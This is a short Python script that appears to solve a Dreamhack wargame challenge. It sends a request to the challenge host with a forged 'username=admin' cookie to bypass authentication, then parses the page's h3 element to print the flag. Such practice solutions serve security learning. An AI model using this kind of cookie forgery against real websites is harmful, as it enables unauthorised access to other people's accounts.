from bs4 import BeautifulSoup
import requests

URL = "http://host1.dreamhack.games:24210/"
PAYLOAD = 'admin'
COOKIE = {'username': PAYLOAD}

resp = requests.get(URL, cookies=COOKIE)
soup = BeautifulSoup(resp.content,"html.parser")
pre = soup.find('h3')
flag = pre.contents[0]
print(flag)